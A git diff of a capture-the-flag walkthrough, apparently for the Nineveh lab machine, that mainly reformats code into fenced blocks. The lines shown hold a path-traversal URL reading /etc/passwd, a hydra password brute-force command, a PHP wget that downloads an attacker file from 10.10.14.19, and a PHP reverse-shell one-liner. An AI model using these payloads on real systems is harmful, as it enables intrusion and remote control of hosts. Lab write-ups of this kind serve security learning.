@@ -102,7 +102,9 @@ Improve the db interface.
 
 Directory Traversal, and LFI is possible with this page, we can easily read /etc/passwd....
 
-`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd`
+```
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
+```
 
 So now we just need to find a way to put a file onto the server!
 
@@ -116,7 +118,6 @@ We just need a password for this, hydra again is the best idea.
 We can use 'whatever' as username ...hydra knows this is a dummy id.
 
 ```
-
 hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
 
 ```
@@ -167,8 +168,9 @@ default value: `<?php system("wget http://10.10.14.19/evil.txt -O /tmp/evil.php;
 
 make evil.txt file containing a php reverse-shell one-liner.
 
-`<?php $sock=fsockopen("10.10.14.19",6969);exec("/bin/sh -i <&3 >&3 2>&3");?>`
-
+```
+<?php $sock=fsockopen("10.10.14.19",6969);exec("/bin/sh -i <&3 >&3 2>&3");?>
+```
 
 start a webserver and nc listener....
 `python3 -m http.server 80`
@@ -180,15 +182,18 @@ start a webserver and nc listener....
 execute the lfi with....(it takes quite some experimentation to get this from the initial lfi address..)
 
 initial lfi indicator
-`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd`
+```
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
+```
 
 
-~~~~~
 eventual working exploit lfi...
 
 `http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/boo.php`
 
-###################################
+
+##################
+
 
 <h3>Privesc to root...</h3>
 
